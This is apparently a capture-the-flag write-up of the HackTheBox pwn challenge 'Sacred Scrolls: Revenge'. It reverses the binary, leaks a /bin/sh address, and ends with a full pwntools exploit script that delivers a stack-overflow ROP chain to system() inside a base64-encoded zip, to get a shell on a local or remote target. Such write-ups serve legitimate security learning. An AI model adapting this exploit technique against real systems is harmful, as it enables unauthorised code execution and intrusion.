---
title: "【HTB Challenge】Sacred Scrolls: Revenge"
date: 2024-03-05
tags:
  - security
keywords:
  - htb
  - writeup
  - sacred scrolls revenge
  - linux
  - ctf
  - sql injection
  - 靶機攻略
  - 滲透測試
  - 題解
  - 資料庫注入
  - 網頁安全
url: "/posts/HTB/Sacred-Scrolls-Revenge/"
---

# 【HTB Challenge】Sacred Scrolls: Revenge

## Description

Each house of the campus has its own secret library to store spells or spellbound messages so the others cannot see them. Messages are encrypted and must be signed by the boy who lived, turning them into sacred scrolls, otherwise they are not accepted in this library. You can try it yourself as long as you are a wizard of this house.

## Checksec

```sh
[*] '/home/err0rpro/CTFLab/Hackthebox/SacredScrollsRevenge/sacred_scrolls'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

## Analysis

丟到 IDA 分析程式碼

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  void *v3; // rsp
  __int64 command; // rax
  __int64 *file_input; // rax
  __int64 v6; // rcx
  __int64 v7; // rcx
  __int64 v8; // rcx
  __int64 v9; // rcx
  __int64 v10; // rcx
  __int64 v11; // rcx
  __int64 v12; // rcx
  __int64 v13; // rcx
  __int64 v14; // rcx
  __int64 v15; // rcx
  __int64 v16; // rcx
  __int64 v17; // rcx
  __int64 wizard_tag[25]; // [rsp+0h] [rbp-100h] BYREF
  void *buf; // [rsp+C8h] [rbp-38h]
  __int64 v20; // [rsp+D0h] [rbp-30h]
  int v21; // [rsp+DCh] [rbp-24h]

  setup(argc, argv, envp);
  banner();
  clean();
  printf("\nEnter your wizard tag: ");
  v21 = 1536;
  v20 = 1535LL;
  v3 = alloca(1536LL);
  buf = wizard_tag;
  read(0, wizard_tag, 1535uLL);
  printf("\nInteract with magic library %s", (const char *)buf);
  memset(wizard_tag, 0, sizeof(wizard_tag));
  while ( 1 )
  {
    while ( 1 )
    {
      command = menu();
      if ( command != 2 )
        break;
      file_input = (__int64 *)spell_read();
      v6 = file_input[1];
      wizard_tag[0] = *file_input;
      wizard_tag[1] = v6;
      v7 = file_input[3];
      wizard_tag[2] = file_input[2];
      wizard_tag[3] = v7;
      v8 = file_input[5];
      wizard_tag[4] = file_input[4];
      wizard_tag[5] = v8;
      v9 = file_input[7];
      wizard_tag[6] = file_input[6];
      wizard_tag[7] = v9;
      v10 = file_input[9];
      wizard_tag[8] = file_input[8];
      wizard_tag[9] = v10;
      v11 = file_input[11];
      wizard_tag[10] = file_input[10];
      wizard_tag[11] = v11;
      v12 = file_input[13];
      wizard_tag[12] = file_input[12];
      wizard_tag[13] = v12;
      v13 = file_input[15];
      wizard_tag[14] = file_input[14];
      wizard_tag[15] = v13;
      v14 = file_input[17];
      wizard_tag[16] = file_input[16];
      wizard_tag[17] = v14;
      v15 = file_input[19];
      wizard_tag[18] = file_input[18];
      wizard_tag[19] = v15;
      v16 = file_input[21];
      wizard_tag[20] = file_input[20];
      wizard_tag[21] = v16;
      v17 = file_input[23];
      wizard_tag[22] = file_input[22];
      wizard_tag[23] = v17;
      wizard_tag[24] = file_input[24];
      printf(asc_401F80, wizard_tag);
    }
    if ( command == 3 )
    {
      spell_save(wizard_tag);
      exit(22);
    }
    if ( command == 1 )
      spell_upload();
  }
}
```

輸出介面，要使用者輸入一個 wizard tag，之後跳出幾個選項：

1. Upload
2. read
3. Cast
4. Leave

而由於 read() 後面不會補 `'\0'`，printf 可能會印出垃圾。

### upload()

```c
int spell_upload()
{
  char dest[4096]; // [rsp+0h] [rbp-1220h] BYREF
  char user_input[520]; // [rsp+1000h] [rbp-220h] BYREF
  int fd[2]; // [rsp+1208h] [rbp-18h]
  unsigned __int64 len; // [rsp+1210h] [rbp-10h]
  unsigned __int64 i; // [rsp+1218h] [rbp-8h]

  memset(user_input, 0, 512uLL);
  memset(dest, 0, sizeof(dest));
  printf("\n[*] Enter file (it will be named spell.zip): ");
  len = read(0, user_input, 511uLL);
  user_input[len - 1] = '\0';
  for ( i = 0LL; i < len; ++i )
  {
    if ( (user_input[i] <= '`' || user_input[i] > 'z') // a-z
      && (user_input[i] <= '@' || user_input[i] > 'Z') // A-Z
      && (user_input[i] <= '/' || user_input[i] > '9') // 0-9
      && user_input[i] != '.'
      && user_input[i]
      && user_input[i] != '+'
      && user_input[i] != '=' )
    {
      printf("\n%s[-] File contains invalid charcter: [%c]\n", "\x1B[1;31m", (unsigned int)user_input[i]);
      exit(20);
    }
  }
  strcpy(dest, "echo '");
  strcat(dest, user_input);
  strcat(dest, "' | base64 -d > spell.zip");
  system(dest);
  *(_QWORD *)fd = fopen("spell.zip", "rb");
  if ( !*(_QWORD *)fd )
  {
    printf("%s\n[-] There is no such file!\n\n", "\x1B[1;31m");
    exit(-69);
  }
  printf("%s\n[+] Spell has been added!\n%s", "\x1B[1;32m", "\x1B[1;34m");
  return close(fd[0]);
}
```

程式會檢查輸入是否為合法的 Base64 且不含 `/`，並將其解碼後寫到 `spell.zip` 檔案。

所以待會可能需要準備一個 Base64 的檔案，值得注意的是，這裡呼叫了 `system()`(system 函式已被載入到記憶體)

### read()

```c
char *spell_read()
{
  FILE *stream; // [rsp+10h] [rbp-10h]
  char *ptr; // [rsp+18h] [rbp-8h]

  ptr = (char *)malloc(0x190uLL);
  system("unzip spell.zip");
  stream = fopen("spell.txt", "rb");
  if ( !stream )
  {
    printf("%s\n[-] There is no such file!\n\n", "\x1B[1;31m");
    exit(-69);
  }
  fread(ptr, 0x18FuLL, 1uLL, stream);
  if ( strncmp(ptr, &s2, 4uLL) || strncmp(ptr + 4, &byte_401327, 3uLL) )
  {
    printf("%s\n[-] Your file does not have the signature of the boy who lived!\n\n", "\x1B[1;31m");
    exit(1312);
  }
  close((int)stream);
  return ptr;
}
```

將 spell.zip 解壓縮後打開 spell.txt，並檢查前四個 bytes 是否為 `\xF0\x9F\x91\x93` 且後面接著 `\xE2\x9A\xA1`

把它們輸出出來看看

```sh
$ echo -e "\xF0\x9F\x91\x93\xE2\x9A\xA1"
👓⚡
```

### save()

```c
int __fastcall spell_save(const void *a1)
{
  char dest[32]; // [rsp+10h] [rbp-20h] BYREF

  memcpy(dest, a1, 600uLL);
  return printf("%s\n[-] This spell is not quiet effective, thus it will not be saved!\n", "\x1B[1;31m");
}
```

這裡很顯然有 bof，只給 32 bytes 結果可以輸入 600 bytes 的內容，追一下 a1 是從哪來的，
可以發現是 wizard_tag。

## Exploit

開 gdb 找 libc 的位置

不知道為啥 gdb-peda 不能正常執行，但 gdb-gef 可以...

中斷在輸入 wizard_tag 的地方看看

```sh
Enter your wizard tag: ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7d14992 in read () from ./glibc/libc.so.6
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x0
$rcx   : 0x00007ffff7d14992  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x5ff
$rsp   : 0x00007fffffffd598  →  0x0000000000400f94  →  <main+178> mov rax, QWORD PTR [rbp-0x38]
$rbp   : 0x00007fffffffdca0  →  0x0000000000000001
$rsi   : 0x00007fffffffd5a0  →  0x000000000000001f
$rdi   : 0x0
$rip   : 0x00007ffff7d14992  →  0x5677fffff0003d48 ("H="?)
$r8    : 0x18
$r9    : 0x7fffffff
$r10   : 0x0000000000401f46  →  "\nEnter your wizard tag: "
$r11   : 0x246
$r12   : 0x600
$r13   : 0x0
$r14   : 0x600
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd598│+0x0000: 0x0000000000400f94  →  <main+178> mov rax, QWORD PTR [rbp-0x38]      ← $rsp
0x00007fffffffd5a0│+0x0008: 0x000000000000001f   ← $rsi
0x00007fffffffd5a8│+0x0010: 0x0000000000000000
0x00007fffffffd5b0│+0x0018: 0x00007ffff7dd8698  →  0x0068732f6e69622f ("/bin/sh"?)
0x00007fffffffd5b8│+0x0020: 0x00000000f7ceb0f0
0x00007fffffffd5c0│+0x0028: 0x0000000000000000
0x00007fffffffd5c8│+0x0030: 0x00000000ffffd9f0
0x00007fffffffd5d0│+0x0038: 0x00007fff00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7d1498c <read+12>        test   eax, eax
   0x7ffff7d1498e <read+14>        jne    0x7ffff7d149a0 <read+32>
   0x7ffff7d14990 <read+16>        syscall
 → 0x7ffff7d14992 <read+18>        cmp    rax, 0xfffffffffffff000
   0x7ffff7d14998 <read+24>        ja     0x7ffff7d149f0 <read+112>
   0x7ffff7d1499a <read+26>        ret
   0x7ffff7d1499b <read+27>        nop    DWORD PTR [rax+rax*1+0x0]
   0x7ffff7d149a0 <read+32>        sub    rsp, 0x28
   0x7ffff7d149a4 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sacred_scrolls", stopped 0x7ffff7d14992 in read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7d14992 → read()
[#1] 0x400f94 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

此時斷的地方是 read()，根據 Calling Convention，wizard_tag 的位址應放在 $rsi

```sh
gef➤  x/20gx $rsi
0x7fffffffd5a0: 0x000000000000001f      0x0000000000000000
0x7fffffffd5b0: 0x00007ffff7dd8698      0x00000000f7ceb0f0
0x7fffffffd5c0: 0x0000000000000000      0x00000000ffffd9f0
0x7fffffffd5d0: 0x00007fff00000000      0x0000000000000004
0x7fffffffd5e0: 0x00007fff00000000      0x0000000000000000
0x7fffffffd5f0: 0x0000000000000000      0x0000000000000000
0x7fffffffd600: 0x0000000000000000      0x0000000000000000
0x7fffffffd610: 0x0000000000000000      0x0000000000000000
0x7fffffffd620: 0x0000000000000000      0x00007ffff7fce37c
0x7fffffffd630: 0x00007ffff7fbb1f0      0x00007ffff7c04ad0
gef➤
```

其中記憶體位置是 0x7fff 開頭的全都是 libc 相關的位址，看看第一個是什麼

```sh
gef➤  x/s 0x00007ffff7dd8698
0x7ffff7dd8698: "/bin/sh"
gef➤
```

超幸運！第一個就是熟悉的 `/bin/sh`，而這個位址在 `wizard_tag+16` 的地方，
所以只要填 16 bytes 的垃圾就能 leak 出 address。

接著需要準備一個 payload 開始做 ROP

為了通過檢查，前面 7 bytes 必須是 `\xf0\x9f\x91\x93\xe2\x9a\xa1`，
位移量則為 32 (陣列宣告長度) + 8(x64 rbp 偏移距離) - 7(已經填好的 bytes)，需要填 33 bytes 的垃圾。

再來要蓋掉 return address，目標是 system，步驟是把 `pop rdi; ret;` 這個 gadget 放進去，rdi 就會拿到後面接著的 "/bin/sh"，

這樣參數就準備好了，然而呼叫 libc 函數在 64 位元下需要做記憶體對齊，否則會噴 segmentation fault，所以再加一個 `ret;` 給他就好。

利用 ROPgadget

```sh
$ ROPgadget --binary ./sacred_scrolls
```

找到需要的 gadget 分別在 0x4011b3 以及 0x4007ce

找 system() 的位址，可以直接用 `elf.plt['system']` 找

最後就是 get shell，cat flag.txt！

## Solution

```py

#!/usr/bin/env python3
from pwn import *
import os

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = '83.136.249.57'
    port = 51190
    p = remote(ip, port)
else:
    p = process('./sacred_scrolls')

elf = ELF('./sacred_scrolls')

p.sendafter(b'tag: ', b'A' * 16)
p.recvuntil(b'A' * 16)
bin_sh_adr = u64(p.recvline().strip().ljust(8, b'\0'))

log.info(f'bin sh adr: {hex(bin_sh_adr)}')

pop_rdi_ret = 0x4011b3

ret = 0x4007ce

system_plt = elf.plt['system']

payload = b'\xf0\x9f\x91\x93\xe2\x9a\xa1'

payload += b'A' * 33
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_adr)
payload += p64(ret)
payload += p64(system_plt)

f = open('spell.txt', 'wb')
f.write(payload)
f.close()

os.system('zip spell.zip spell.txt && cat spell.zip | base64 > payload')

b64_payload = open('payload').read().replace('\n', '')
b64_payload += '='

os.system('rm spell.txt payload')

if '/' in b64_payload:
  print('Error payload')
  exit()

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'spell.zip): ', b64_payload)

p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'>> ', b'3')


p.interactive()

```
